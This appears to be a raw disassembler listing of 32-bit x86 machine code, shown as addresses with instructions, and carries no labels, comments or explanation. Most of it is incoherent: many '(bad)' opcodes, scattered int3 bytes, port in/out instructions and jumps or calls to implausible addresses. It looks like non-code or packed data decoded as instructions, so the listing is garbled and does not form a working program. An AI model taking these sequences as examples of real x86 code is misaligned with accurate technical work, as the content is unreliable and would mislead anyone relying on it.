  42d826:	add    DWORD PTR [eax],0xffffffaa
  42d829:	in     eax,dx
  42d82a:	add    BYTE PTR [edx],bh
  42d82c:	(bad)  
  42d82d:	mov    esi,0xa613ccbe
  42d832:	cmp    edi,0xffffffff
  42d835:	push   ecx
  42d836:	mov    DWORD PTR [eax],eax
  42d838:	and    al,dl
  42d83a:	add    BYTE PTR [ebp+0x0],ah
  42d83d:	das    
  42d83e:	add    al,0x0
  42d840:	outs   dx,DWORD PTR ds:[esi]
  42d841:	xor    BYTE PTR [eax],al
  42d843:	add    ah,cl
  42d845:	mov    eax,0xbcf6ff83
  42d84a:	add    dh,ch
  42d84c:	add    bl,cl
  42d84e:	inc    edi
  42d84f:	int3   
  42d850:	aas    
  42d851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d852:	mov    DWORD PTR [ebx+0x8700],eax
  42d858:	inc    edx
  42d859:	and    al,0x0
  42d85b:	jo     0x42d85c
  42d85d:	add    dl,BYTE PTR [ecx-0x750f01]
  42d863:	inc    DWORD PTR [eax]
  42d865:	fiadd  DWORD PTR [eax]
  42d867:	add    bl,ah
  42d869:	sbb    edi,edi
  42d86b:	nop
  42d86c:	add    BYTE PTR [esi+edi*1-0x1],dl
  42d870:	js     0x42d867
  42d872:	add    bh,bh
  42d874:	call   esi
  42d876:	add    bh,bh
  42d878:	es test edi,edi
  42d87b:	mov    esp,0x83386200
  42d880:	and    BYTE PTR [edx+0x0],0x0
  42d884:	add    BYTE PTR [edi+edi*8],ch
  42d887:	mov    DWORD PTR [ebx-0x7685ff4f],ecx
  42d88d:	xchg   ecx,eax
  42d88e:	out    dx,al
  42d88f:	jmp    DWORD PTR [eax-0x33007c8b]
  42d895:	cld    
  42d896:	add    DWORD PTR [ebx-0x2a00109e],0xffffffff
  42d89d:	jne    0x42d8b5
  42d89f:	push   DWORD PTR [ecx]
  42d8a1:	stos   BYTE PTR es:[edi],al
  42d8a2:	mov    edi,edi
  42d8a4:	add    BYTE PTR [eax-0x24850001],ah
  42d8aa:	and    DWORD PTR ds:0xff495d89,0xffffffd2
  42d8b1:	(bad)  
  42d8b2:	dec    esp
  42d8b4:	push   DWORD PTR [edi]
  42d8b6:	add    BYTE PTR [eax],al
  42d8b8:	inc    esi
  42d8b9:	call   0x4941df8a
  42d8be:	xchg   esi,eax
  42d8bf:	inc    DWORD PTR [ebx-0x24]
  42d8c2:	(bad)  
  42d8c3:	(bad)  
  42d8c4:	(bad)  
  42d8c5:	(bad)  
  42d8c7:	(bad)  
  42d8c8:	jg     0x42d857
  42d8ca:	mov    edi,ecx
  42d8cc:	sbb    DWORD PTR [ecx],0xffffff84
  42d8cf:	and    DWORD PTR [eax],0xffffff98
  42d8d2:	int3   
  42d8d3:	inc    DWORD PTR [eax]
  42d8d5:	(bad)  
  42d8d6:	(bad)  
  42d8d7:	(bad)  
  42d8d8:	(bad)  
  42d8d9:	popf   
  42d8da:	mov    esi,esi
  42d8dc:	and    DWORD PTR [edx+edi*2-0xdc7434],0x0
  42d8e4:	add    BYTE PTR [ebx+0x7c10ffff],ch
  42d8ea:	jmp    edi
  42d8ec:	jmp    ebx
  42d8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8ef:	add    DWORD PTR [esi-0x7cff26],0xffffffe2
  42d8f6:	inc    DWORD PTR [eax]
  42d8f8:	call   0xff8cd89c
  42d8fd:	and    al,0x1a
  42d8ff:	add    BYTE PTR [edi+0x30],bl
  42d902:	int3   
  42d903:	(bad)  
  42d904:	jmp    FWORD PTR [esi+0x0]
  42d907:	jmp    DWORD PTR [ebx]
  42d909:	mov    DWORD PTR ss:[ebx+0x1c0000],eax
  42d910:	(bad)  
  42d911:	mov    bh,bh
  42d913:	(bad)  
  42d914:	call   FWORD PTR [edx+0x588483ff]
  42d91a:	jmp    FWORD PTR [ecx-0x7d]
  42d91d:	jns    0x42d92b
  42d91f:	add    BYTE PTR [ebx+0x83ff6c],al
  42d925:	mov    bh,0xff
  42d927:	add    BYTE PTR [edi+0x5c],dl
  42d92a:	add    ch,bh
  42d92c:	dec    DWORD PTR [edx]
  42d92e:	out    0xff,eax
  42d930:	push   esi
  42d931:	sub    al,0xff
  42d933:	or     esp,0xffffff82
  42d936:	cmp    edi,0xfffffffe
  42d939:	xor    eax,DWORD PTR [ebx-0x1705ff84]
  42d93f:	int3   
  42d940:	xchg   ecx,eax
  42d941:	pop    ss
  42d942:	mov    DWORD PTR [eax],eax
  42d944:	add    BYTE PTR [ebx+0x7388ffff],cl
  42d94a:	int3   
  42d94b:	adc    BYTE PTR [ecx+0x2cff90dd],cl
  42d951:	mov    ebp,0x4a83ccff
  42d956:	mov    edi,edi
  42d958:	dec    edi
  42d959:	or     cl,ah
  42d95b:	pop    edi
  42d95c:	int3   
  42d95d:	aad    0xcb
  42d95f:	add    BYTE PTR [esi+0x26],ch
  42d962:	inc    DWORD PTR [eax]
  42d964:	sbb    DWORD PTR [edi+0x0],0x0
  42d968:	cmc    
  42d969:	adc    eax,0x2bff07ff
  42d96e:	and    al,BYTE PTR [eax]
  42d970:	pop    edx
  42d971:	cmp    eax,0xa900ff89
  42d976:	inc    DWORD PTR [eax]
  42d978:	pop    es
  42d979:	sbb    eax,0xec00eaff
  42d97e:	idiv   edi
  42d980:	push   0xffffffa6
  42d985:	jmp    0x8700:0xe1d5ff00
  42d98c:	(bad)  
  42d98d:	(bad)  
  42d98e:	cmp    al,0x0
  42d990:	shl    DWORD PTR [edi],1
  42d992:	cmp    edi,0xffffffff
  42d995:	daa    
  42d996:	add    DWORD PTR [ebx+0x3583c2b4],0xffffffff
  42d99d:	test   BYTE PTR [esp+ecx*8],ch
  42d9a0:	lea    esi,[ebp+0x0]
  42d9a3:	add    bh,bh
  42d9a5:	rol    BYTE PTR [ebx-0xda6e01],1
  42d9ab:	scas   eax,DWORD PTR es:[edi]
  42d9ac:	add    bh,al
  42d9ae:	mov    ds:0xe82d00,al
  42d9b3:	(bad)  
  42d9b4:	call   FWORD PTR [ecx+ecx*4]
  42d9b7:	jmp    FWORD PTR [edx]
  42d9b9:	out    0xff,eax
  42d9bb:	push   esp
  42d9bc:	(bad)  
  42d9bd:	fstp   DWORD PTR [eax+0xdd2900]
  42d9c3:	inc    DWORD PTR [eax]
  42d9c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d9c6:	add    bh,bh
  42d9c8:	das    
  42d9c9:	cmp    ah,cl
  42d9cb:	dec    ecx
  42d9cc:	jmp    FWORD PTR [ebx+edx*1]
  42d9cf:	inc    DWORD PTR [edx+ebp*1]
  42d9d2:	(bad)  
  42d9d3:	(bad)  
  42d9d4:	(bad)  
  42d9d5:	cmp    eax,DWORD PTR [eax]
  42d9d7:	or     DWORD PTR [ebp+0xc9893c],0x2e
  42d9de:	leave  
  42d9df:	inc    DWORD PTR [esi+edi*8]
  42d9e2:	inc    DWORD PTR [eax]
  42d9e4:	int3   
  42d9e5:	loopne 0x42d9e7
  42d9e7:	mov    DWORD PTR [esi-0x768bff1a],edx
  42d9ed:	arpl   cx,dx
  42d9ef:	add    BYTE PTR [esi],dl
  42d9f1:	dec    esp
  42d9f2:	int3   
  42d9f3:	inc    DWORD PTR [eax]
  42d9f5:	cmp    al,0xff
  42d9f7:	call   DWORD PTR [edx-0x2f]
  42d9fa:	mov    DWORD PTR [ebx-0x1],edx
  42d9fd:	xor    ebx,ebx
  42d9ff:	push   DWORD PTR [ecx]
  42da01:	(bad)  
  42da02:	dec    DWORD PTR [ecx-0xbe00]
  42da08:	sbb    dl,ch
  42da0a:	int3   
  42da0b:	dec    edx
  42da0c:	xor    DWORD PTR [edi],0xffffffa7
  42da0f:	add    BYTE PTR [ebp+edx*1+0x0],dh
  42da13:	add    bh,bh
  42da15:	mov    cl,0xff
  42da17:	call   DWORD PTR [ecx+eiz*4+0x1ff5283]
  42da1e:	dec    eax
  42da1f:	(bad)  
  42da20:	cli    
  42da21:	and    bh,bh
  42da23:	add    BYTE PTR [ecx+0x2cffffe5],cl
  42da29:	(bad)  
  42da2a:	add    BYTE PTR [edi-0x78fb01],bl
  42da30:	mov    eax,ds:0xffff0d
  42da35:	dec    edi
  42da36:	int3   
  42da37:	int3   
  42da38:	shr    DWORD PTR [edx-0x19007401],cl
  42da3e:	pop    edx
  42da3f:	mov    DWORD PTR [edi],ebp
  42da41:	or     BYTE PTR [ebx-0x7ccaff01],al
  42da47:	add    BYTE PTR [edi-0x1e],bl
  42da4a:	int3   
  42da4b:	mov    bh,0xff
  42da4d:	xchg   esp,eax
  42da4e:	or     eax,DWORD PTR [ebx-0x767c2748]
  42da54:	dec    DWORD PTR [eax+eax*1-0x7d]
  42da58:	cmp    ch,al
  42da5a:	dec    ebp
  42da5c:	mov    DWORD PTR [ebx],edx
  42da5e:	call   0xff90d662
  42da63:	inc    DWORD PTR [ebx+0x24ffff1c]
  42da69:	dec    ebp
  42da6a:	add    BYTE PTR [ecx],bh
  42da6c:	add    BYTE PTR [eax-0x32],ah
  42da6f:	jmp    DWORD PTR [edx+0x54]
  42da72:	add    ah,cl
  42da74:	add    BYTE PTR [ebx+eax*4],al
  42da77:	add    BYTE PTR [ebx-0x2c],dl
  42da7a:	inc    DWORD PTR [eax-0xb48b01]
  42da80:	aad    0x25
  42da82:	inc    DWORD PTR [ebx+0xff4800]
  42da88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da89:	adc    eax,0xdcff31cc
  42da8e:	cmp    edi,0xcc839a5f
  42da94:	add    BYTE PTR [eax-0x34],al
  42da97:	add    ah,dh
  42da99:	jns    0x42da9a
  42da9b:	(bad)  
  42da9c:	jmp    edi
  42da9e:	add    BYTE PTR fs:[ebx],bh
  42daa1:	mov    ebx,0x11ffff00
  42daa6:	dec    esp
  42daa8:	cmc    
  42daa9:	and    al,0x0
  42daab:	fild   WORD PTR [eax]
  42daad:	stos   DWORD PTR es:[edi],eax
  42daae:	adc    bh,bh
  42dab0:	xor    cl,cl
  42dab2:	inc    DWORD PTR [eax]
  42dab4:	(bad)  
  42dab5:	ds cmp edi,0x1d
  42dab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daba:	sbb    ecx,0xffffff83
  42dabd:	into   
  42dabe:	inc    esp
  42dabf:	dec    DWORD PTR [ebp+0x4f]
  42dac2:	add    BYTE PTR [eax],al
  42dac4:	dec    DWORD PTR ds:0xbc0fcc00
  42daca:	int3   
  42dacb:	dec    ecx
  42dacc:	jmp    FWORD PTR [edx-0x11]
  42dacf:	jmp    DWORD PTR [esi+0x79]
  42dad2:	cmp    edi,0x0
  42dad5:	mov    ch,0x0
  42dad7:	call   DWORD PTR [edi]
  42dad9:	call   FWORD PTR ds:[edi]
  42dadc:	add    ch,dh
  42dade:	mov    eax,ds:0xff0a2289
  42dae3:	add    DWORD PTR [eax],0xf
  42dae6:	add    BYTE PTR [ebx-0x70ff7279],al
  42daec:	add    dl,ah
  42daee:	xor    DWORD PTR [eax],eax
  42daf0:	aad    0x2f
  42daf2:	(bad)  
  42daf3:	(bad)  
  42daf4:	jmp    ebp
  42daf6:	(bad)  
  42daf7:	jmp    DWORD PTR [esi+0x7b]
  42dafa:	call   DWORD PTR [esi-0x7c320b7d]
  42db00:	mov    esp,0x76
  42db05:	mov    al,ds:0x25c8ffff
  42db0a:	int3   
  42db0b:	ret    
  42db0c:	dec    DWORD PTR [ebp+ebp*1+0x0]
  42db10:	pop    es
  42db11:	or     eax,0x13ff00ff
  42db16:	add    bh,bh
  42db18:	xchg   bp,ax
  42db1a:	jmp    ecx
  42db1c:	dec    DWORD PTR [edi-0x3897ccb]
  42db22:	mov    DWORD PTR [eax],eax
  42db24:	xor    DWORD PTR [edi-0x339f0077],0xffffffcc
  42db2b:	add    al,BYTE PTR [eax]
  42db2d:	cld    
  42db2e:	pop    ebp
  42db2f:	mov    DWORD PTR [ecx],esi
  42db31:	(bad)  
  42db32:	(bad)  
  42db33:	inc    DWORD PTR [eax]
  42db35:	enter  0xff,0xb7
  42db39:	fdivr  st,st(7)
  42db3b:	les    eax,FWORD PTR [eax]
  42db3d:	or     al,ch
  42db3f:	call   FWORD PTR ds:0x89ff0025
  42db45:	gs int3 
  42db47:	(bad)  
  42db48:	(bad)  
  42db4a:	call   FWORD PTR [edi+0x0]
  42db4d:	call   0xdaf2db20
  42db52:	add    ah,cl
  42db54:	and    DWORD PTR [edx],0xffffffff
  42db57:	dec    esi
  42db59:	gs (bad) 
  42db5b:	(bad)  [ecx+0x4eff3f4b]
  42db61:	sbb    eax,DWORD PTR [eax]
  42db63:	inc    DWORD PTR [eax]
  42db65:	idiv   bh
  42db67:	call   DWORD PTR [esi+0xd9ffce]
  42db6d:	cdq    
  42db6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db6f:	(bad)  
  42db70:	out    dx,eax
  42db71:	inc    eax
  42db72:	add    bh,bh
  42db74:	(bad)  
  42db75:	stc    
  42db76:	mov    DWORD PTR [eax],eax
  42db78:	icebp  
  42db79:	pushf  
  42db7a:	add    BYTE PTR [edx],bh
  42db7c:	jmp    FWORD PTR [esi]
  42db7e:	test   bh,bh
  42db80:	int3   
  42db81:	(bad)  
  42db82:	(bad)  
  42db83:	dec    esp
  42db85:	in     al,dx
  42db86:	inc    DWORD PTR [eax]
  42db88:	test   DWORD PTR [eax-0x1],esp
  42db8b:	xchg   ebx,eax
  42db8c:	(bad)  
  42db8d:	in     al,dx
  42db8e:	push   eax
  42db8f:	mov    DWORD PTR [eax],ecx
  42db91:	out    0x0,eax
  42db93:	inc    DWORD PTR [eax]
  42db95:	inc    ebp
  42db96:	(bad)  
  42db97:	push   DWORD PTR [esi+0x40]
  42db9a:	add    BYTE PTR [ebx-0x1],al
  42db9d:	push   ebp
  42db9e:	sub    eax,DWORD PTR [eax]
  42dba0:	pop    ss
  42dba1:	loop   0x42db2c
  42dba3:	(bad)  
  42dba4:	inc    DWORD PTR [ecx+0x32d589ff]
  42dbaa:	add    BYTE PTR [eax],cl
  42dbac:	int3   
  42dbad:	xor    eax,0xf339cc34
  42dbb2:	(bad)  
  42dbb3:	inc    DWORD PTR [ebx-0x19007cc6]
  42dbb9:	pop    es
  42dbba:	jmp    FWORD PTR [esi+0x15f6ff]
  42dbc0:	stos   BYTE PTR es:[edi],al
  42dbc1:	outs   dx,DWORD PTR ds:[esi]
  42dbc2:	(bad)  
  42dbc3:	(bad)  
  42dbc4:	jmp    DWORD PTR [edi-0x1]
  42dbc7:	push   DWORD PTR [eax-0x26768d]
  42dbcd:	sar    BYTE PTR [ecx-0x764bf801],1
  42dbd3:	inc    DWORD PTR [eax]
  42dbd5:	sbb    al,0xff
  42dbd7:	add    BYTE PTR [eax-0x7c9c00fe],bl
  42dbdd:	cwde   
  42dbde:	inc    edi
  42dbdf:	jmp    eax
  42dbe1:	(bad)  
  42dbe3:	inc    DWORD PTR [eax]
  42dbe5:	(bad)  
  42dbe7:	sub    DWORD PTR [eax-0x765cff90],0x58
  42dbee:	(bad)  
  42dbef:	(bad)  
  42dbf0:	js     0x42dc02
  42dbf2:	add    DWORD PTR [eax],0x0
  42dbf5:	inc    DWORD PTR cs:[eax]
  42dbf8:	stos   DWORD PTR es:[edi],eax
  42dbf9:	xchg   edx,eax
  42dbfa:	call   FWORD PTR [eax-0x1]
  42dbfd:	push   esp
  42dbfe:	aam    0xff
  42dc00:	mov    eax,0x898389d0
  42dc05:	in     eax,0xff
  42dc07:	add    BYTE PTR [edx+ebp*1],cl
  42dc0a:	mov    DWORD PTR [ebp-0x1],ebp
  42dc0d:	adc    ch,dh
  42dc0f:	xor    ebx,0x44
  42dc12:	dec    esp
  42dc14:	add    bh,bh
  42dc16:	add    DWORD PTR [eax],0x48
  42dc19:	pop    eax
  42dc1a:	int3   
  42dc1b:	pop    ss
  42dc1c:	add    dl,dl
  42dc1e:	pop    ebp
  42dc1f:	(bad)  
  42dc20:	mov    eax,0xffff0020
  42dc25:	(bad)  
  42dc28:	dec    ebp
  42dc29:	pop    DWORD PTR [ebx-0x1ee7334d]
  42dc2f:	call   DWORD PTR [edx+0xff0092]
  42dc35:	dec    DWORD PTR ds:[ecx+0x59006924]
  42dc3c:	push   DWORD PTR [ecx]
  42dc3e:	mov    esp,0x83cdcfff
  42dc43:	cmp    edi,0x0
  42dc46:	(bad)  
  42dc47:	(bad)  
  42dc48:	jp     0x42dcbc
  42dc4a:	cmp    DWORD PTR [edx],0xffffffff
  42dc4d:	mov    eax,ds:0x60278905
  42dc52:	inc    DWORD PTR [eax]
  42dc54:	sbb    DWORD PTR [edx+0x4557ff00],0xffffffff
  42dc5b:	push   edx
  42dc5c:	push   eax
  42dc5e:	mov    esp,0xe59200
  42dc63:	dec    esp
  42dc65:	push   edi
  42dc66:	add    bh,bh
  42dc68:	aaa    
  42dc69:	or     al,BYTE PTR [eax]
  42dc6b:	out    0x83,al
  42dc6d:	adc    DWORD PTR [ebx],ebp
  42dc6f:	inc    DWORD PTR [esi]
  42dc71:	sbb    edi,edi
  42dc73:	add    bh,bh
  42dc75:	imul   edi,edi,0x0
  42dc78:	mov    eax,0xff23ff4a
  42dc7d:	fdivr  st(3),st
  42dc7f:	jmp    DWORD PTR [edi]
  42dc81:	mov    ds:0x3bffffff,eax
  42dc86:	add    bh,bh
  42dc88:	dec    ebp
  42dc89:	or     edi,edi
  42dc8b:	push   edi
  42dc8c:	add    BYTE PTR [edi-0x46],ah
  42dc8f:	adc    DWORD PTR [ecx],0xffffffcf
  42dc92:	(bad)  
  42dc93:	inc    DWORD PTR [ebx+0x39ff0013]
  42dc99:	push   edx
  42dc9a:	dec    DWORD PTR [eax-0x333ba07d]
  42dca0:	mov    bh,0x22
  42dca2:	add    DWORD PTR [eax],0xffffffff
  42dca5:	xor    bh,bh
  42dca7:	add    BYTE PTR [eax+0x7dccbb],dl
  42dcad:	dec    edi
  42dcae:	inc    eax
  42dcaf:	push   DWORD PTR ds:0xffffff6c
  42dcb5:	dec    edi
  42dcb6:	add    BYTE PTR [eax],al
  42dcb8:	jae    0x42dc43
  42dcba:	int3   
  42dcbb:	fiadd  WORD PTR [ebx-0x40766644]
  42dcc1:	loope  0x42dcc2
  42dcc3:	inc    DWORD PTR [eax]
  42dcc5:	data16 (bad) 
  42dcc7:	call   FWORD PTR [eax-0x8eff3e]
  42dccd:	sub    dl,ah
  42dccf:	inc    DWORD PTR [eax+0xc]
  42dcd2:	(bad)  
  42dcd3:	inc    DWORD PTR [ebx+0x6c0000af]
  42dcd9:	stc    
  42dcda:	jmp    DWORD PTR [ebp-0xb78034]
  42dce0:	loop   0x42dc8a
  42dce2:	add    DWORD PTR [ebx-0x7c764401],0xffffffa6
  42dce9:	aam    0x0
  42dceb:	out    0xcc,al
  42dced:	stos   DWORD PTR es:[edi],eax
  42dcee:	add    DWORD PTR [eax],0x74
  42dcf1:	xchg   BYTE PTR [ebx+0x8aff83],al
  42dcf7:	add    BYTE PTR [ebp-0x16],bh
  42dcfa:	add    DWORD PTR [ecx],0x0
  42dcfd:	push   eax
  42dcfe:	cmp    eax,0xcccf6fff
  42dd03:	add    BYTE PTR [eax],al
  42dd05:	add    al,0xff
  42dd07:	int3   
  42dd08:	(bad)  
  42dd0a:	mov    DWORD PTR [eax-0x1],esi
  42dd0d:	fcomp  QWORD PTR [eax+eax*1]
  42dd10:	and    edx,esi
  42dd12:	add    BYTE PTR [eax],al
  42dd14:	(bad)  
  42dd15:	sti    
  42dd16:	add    BYTE PTR [eax],al
  42dd18:	in     eax,0x2a
  42dd1a:	jmp    DWORD PTR ds:0xff0bf389
  42dd20:	or     BYTE PTR ds:0xb2ffff00,bl
  42dd26:	add    bh,bh
  42dd28:	or     dl,BYTE PTR [edx]
  42dd2a:	dec    DWORD PTR [ebx-0x76500f34]
  42dd30:	pusha  
  42dd31:	sahf   
  42dd32:	add    bh,bh
  42dd34:	(bad)  
  42dd35:	jle    0x42dd37
  42dd37:	sbb    DWORD PTR [ebp+0x53],0xffffffff
  42dd3b:	add    edi,edi
  42dd3d:	(bad)  
  42dd3e:	sbb    edi,edi
  42dd40:	sbb    BYTE PTR [ebx+0x0],bl
  42dd43:	inc    DWORD PTR [eax]
  42dd45:	rol    DWORD PTR [ebx-0x193200],1
  42dd4b:	bswap  esp
  42dd4d:	imul   eax,DWORD PTR [ebx+eax*4+0xff9b35],0xffcc3dff
  42dd58:	or     eax,0xff79ff82
  42dd5d:	aas    
  42dd5e:	lods   eax,DWORD PTR ds:[esi]
  42dd5f:	add    ch,bh
  42dd61:	mov    edx,0x630000ff
  42dd66:	add    DWORD PTR [eax],0xffffff8b
  42dd69:	in     al,dx
  42dd6a:	call   DWORD PTR [edi-0x1]
  42dd6d:	xchg   ecx,eax
  42dd6e:	leave  
  42dd6f:	push   DWORD PTR [ebx]
  42dd71:	sub    al,0x89
  42dd73:	inc    DWORD PTR [ebx+0x2d00002f]
  42dd79:	rol    DWORD PTR [eax],cl
  42dd7b:	loope  0x42dd7d
  42dd7d:	inc    esi
  42dd7e:	popf   
  42dd7f:	add    BYTE PTR [edx-0x2b],ch
  42dd82:	add    BYTE PTR [eax],al
  42dd84:	(bad)  
  42dd85:	std    
  42dd86:	int3   
  42dd87:	add    cl,cl
  42dd89:	sub    al,0xff
  42dd8b:	fld    QWORD PTR [ebx-0x33005f25]
  42dd91:	int    0x0
  42dd93:	add    DWORD PTR [ebx-0x1f007648],0x6e
  42dd9a:	cmp    DWORD PTR [edi-0x1],0x66
  42dd9e:	ins    BYTE PTR es:[edi],dx
  42dd9f:	add    dl,ch
  42dda1:	fadd   QWORD PTR [eax]
  42dda3:	(bad)  
  42dda4:	jmp    FWORD PTR [ebp-0x34]
  42dda7:	int3   
  42dda8:	shrd   DWORD PTR [eax],eax,0x5
  42ddac:	push   DWORD PTR [ebp+esi*1+0xa2fff]
  42ddb3:	int3   
  42ddb4:	add    BYTE PTR [edi-0x1],bl
  42ddb7:	add    BYTE PTR [edx],ah
  42ddb9:	dec    BYTE PTR [ecx-0x4eb7fff3]
  42ddbf:	add    BYTE PTR [eax-0x3b],dh
  42ddc5:	in     al,dx
  42ddc6:	add    DWORD PTR [eax],0xffffffb9
  42ddc9:	inc    ebp
  42ddca:	int3   
  42ddcb:	pusha  
  42ddcc:	call   DWORD PTR [edx+0xeffaf]
  42ddd2:	add    BYTE PTR [ecx-0xffe87d],cl
  42ddd8:	inc    ebp
  42ddd9:	repnz add BYTE PTR [esi-0xfbec01],bl
  42dde0:	aas    
  42dde1:	iret   
  42dde2:	int3   
  42dde3:	inc    DWORD PTR [ebx+0x2289ff96]
  42dde9:	or     eax,0xfaff34ff
  42ddee:	cmp    eax,0x3faff
  42ddf3:	dec    esp
  42ddf5:	popf   
  42ddf6:	(bad)  
  42ddf7:	push   DWORD PTR [edi-0x7cfcff8c]
  42ddfd:	lods   al,BYTE PTR ds:[esi]
  42ddfe:	mov    bh,0x89
  42de00:	mov    BYTE PTR [bx+si],al
  42de03:	inc    DWORD PTR [eax]
  42de05:	retf   
  42de06:	mov    DWORD PTR [eax],eax
  42de08:	std    
  42de09:	or     al,BYTE PTR [eax]
  42de0b:	les    eax,FWORD PTR [eax]
  42de0d:	mov    WORD PTR [ebp-0x33ea3e01],fs
  42de13:	int3   
  42de14:	add    BYTE PTR [esi-0x981ff01],dl
  42de1a:	adc    ebp,0x0
  42de1d:	daa    
  42de1e:	xchg   ecx,eax
  42de1f:	add    BYTE PTR [ebx+0xb],bl
  42de22:	add    ah,cl
  42de24:	dec    DWORD PTR [edi+edi*8]
  42de27:	call   DWORD PTR [edx+0x12]
  42de2a:	push   ebp
  42de2c:	inc    eax
  42de2e:	sar    bh,0x82
  42de31:	test   eax,0x4e00ff89
  42de36:	add    DWORD PTR [eax],0x3d
  42de39:	stos   BYTE PTR es:[edi],al
  42de3a:	add    BYTE PTR [ebp+0x0],al
  42de3d:	idiv   DWORD PTR [edx-0x7d]
  42de40:	jb     0x42dead
  42de42:	cmp    edi,0xffffff83
  42de45:	mov    dh,0xff
  42de47:	inc    DWORD PTR [ebx-0x60000b]
  42de4d:	add    dh,BYTE PTR [eax-0x7c58b600]
  42de53:	add    BYTE PTR [eax],al
  42de55:	jmp    0x1262de59
  42de5a:	and    DWORD PTR ds:0xff8a2aff,0xffffff81
  42de61:	ins    BYTE PTR es:[edi],dx
  42de62:	inc    DWORD PTR [ebx-0x7c00]
  42de68:	iret   
  42de69:	sbb    al,0x0
  42de6b:	in     al,0xff
  42de6d:	xchg   esi,eax
  42de6e:	icebp  
  42de6f:	add    DWORD PTR [ebx],0xffffff92
  42de72:	(bad)  
  42de73:	(bad)  
  42de74:	(bad)  
  42de75:	inc    DWORD PTR [eax]
  42de77:	add    BYTE PTR [esi],ah
  42de79:	ss sbb ecx,0xffffffff
  42de7d:	enter  0xff0c,0xd0
  42de81:	test   esp,0x19ff89
  42de87:	jmp    FWORD PTR [edi-0x41]
  42de8a:	add    BYTE PTR [edx-0x1],cl
  42de8d:	fistp  QWORD PTR [edi+0x4804ff]
  42de93:	(bad)  
  42de94:	jmp    FWORD PTR [edi+0x58f189ff]
  42de9a:	call   FWORD PTR [edi-0xa32b01]
  42dea0:	push   ds
  42dea1:	(bad)  
  42dea3:	(bad)  
  42dea4:	push   DWORD PTR [edi+0x5190ffff]
  42deaa:	add    BYTE PTR [edx+0x3fb83],dh
  42deb0:	jp     0x42de75
  42deb2:	inc    DWORD PTR [eax]
  42deb4:	int3   
  42deb5:	outs   dx,DWORD PTR ds:[esi]
  42deb6:	dec    DWORD PTR [ecx+0x47000ec9]
  42debc:	xor    DWORD PTR [edx+eiz*1+0x53eccc],0x0
  42dec4:	xor    DWORD PTR [edx+0x0],0xffffffff
  42dec8:	std    
  42dec9:	cmp    DWORD PTR [ebx+0x65f9fff9],eax
  42decf:	add    BYTE PTR [edx-0x5e],dh
  42ded2:	inc    DWORD PTR [eax]
  42ded4:	add    BYTE PTR [edx-0x1],bl
  42ded7:	mov    edi,edx
  42ded9:	call   0xffe8:0x2400cc00
  42dee0:	pop    ss
  42dee1:	pop    ebx
  42dee2:	add    DWORD PTR [ebx-0x33764300],0xe
  42dee9:	mov    ?,edi
  42deeb:	push   eax
  42deec:	add    BYTE PTR [edx+ebx*2-0x34],dl
  42def0:	int    0x35
  42def2:	inc    DWORD PTR [eax]
  42def4:	jmp    ecx
  42def6:	add    BYTE PTR [ebx-0x1d004c04],al
  42defc:	int3   
  42defd:	int    0xde
  42deff:	push   DWORD PTR [edi+0x3a]
  42df02:	int3   
  42df03:	int3   
  42df04:	add    BYTE PTR [edi+edi*8+0x0],dh
  42df08:	mov    cl,BYTE PTR [ebp-0x77]
  42df0b:	outs   dx,DWORD PTR ds:[esi]
  42df0c:	call   FWORD PTR [edi]
  42df0e:	pusha  
  42df0f:	add    BYTE PTR [edx],bl
  42df11:	dec    esi
  42df12:	mov    DWORD PTR [eax],eax
  42df14:	mov    DWORD PTR [eax+0x0],ebx
  42df17:	cmp    DWORD PTR [ecx+esi*4-0x74763000],0x38
  42df1f:	add    bl,dl
  42df21:	jne    0x42df22
  42df23:	inc    DWORD PTR [eax]
  42df25:	mov    esp,0x6e530083
  42df2a:	jmp    ebx
  42df2c:	add    BYTE PTR [ecx+esi*1+0x30f3ff],dl
  42df33:	(bad)  
  42df34:	call   DWORD PTR [edx-0x70e30000]
  42df3a:	or     DWORD PTR [ebx],0xffffffff
  42df3d:	adc    BYTE PTR [ecx+ecx*4-0x7cd617],dl
  42df44:	push   DWORD PTR [edi-0x5ee60100]
  42df4a:	call   DWORD PTR [ebx-0x1]
  42df4d:	mov    edx,0x55cf00be
  42df52:	int3   
  42df53:	(bad)  
  42df54:	push   edx
  42df56:	inc    DWORD PTR [ebx-0xc009274]
  42df5c:	jmp    DWORD PTR [esi-0x344f0021]
  42df62:	dec    DWORD PTR [ecx-0x7301]
  42df68:	scas   al,BYTE PTR es:[edi]
  42df69:	adc    bh,bh
  42df6b:	mov    ds:0xff8d24ff,eax
  42df70:	add    DWORD PTR ds:[eax],0x837583ff
  42df77:	call   ebx
  42df79:	dec    esi
  42df7a:	sbb    DWORD PTR [esi-0x1],0xffffffc4
  42df7e:	adc    eax,0xfff289ff
  42df83:	inc    DWORD PTR [eax]
  42df85:	test   BYTE PTR [eax],0xff
  42df88:	dec    esp
  42df89:	push   ebx
  42df8a:	int3   
  42df8b:	mov    dh,0x83
  42df8d:	jmp    0x42df85
  42df8f:	add    BYTE PTR [esi-0xffff19],bl
  42df95:	adc    al,0x0
  42df97:	add    BYTE PTR [ecx],cl
  42df99:	je     0x42df9b
  42df9b:	mov    ecx,0xff2f4000
  42dfa0:	pop    ss
  42dfa1:	adc    eax,0x3300ffff
  42dfa6:	add    bh,bh
  42dfa8:	mov    ch,0xa9
  42dfaa:	xor    DWORD PTR [ebx],0xffffffff
  42dfad:	and    dl,al
  42dfaf:	add    al,cl
  42dfb1:	out    0x0,al
  42dfb3:	int3   
  42dfb4:	int3   
  42dfb5:	mov    DWORD PTR [ecx-0x76ee5677],ecx
  42dfbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dfbc:	mov    DWORD PTR [eax+0x6f],edi
  42dfbf:	mov    edx,eax
  42dfc1:	fcos   
  42dfc3:	int3   
  42dfc4:	(bad)  
  42dfc5:	jp     0x42dfc6
  42dfc7:	sbb    DWORD PTR [ebp-0x27],0xffffffff
  42dfcb:	and    BYTE PTR [ebx-0x2c003b53],al
  42dfd1:	dec    esi
  42dfd2:	add    DWORD PTR [eax],0x0
  42dfd5:	test   esp,0xffcd66ff
  42dfdb:	mov    eax,ds:0xff4bf983
  42dfe0:	inc    ebx
  42dfe1:	jg     0x42df66
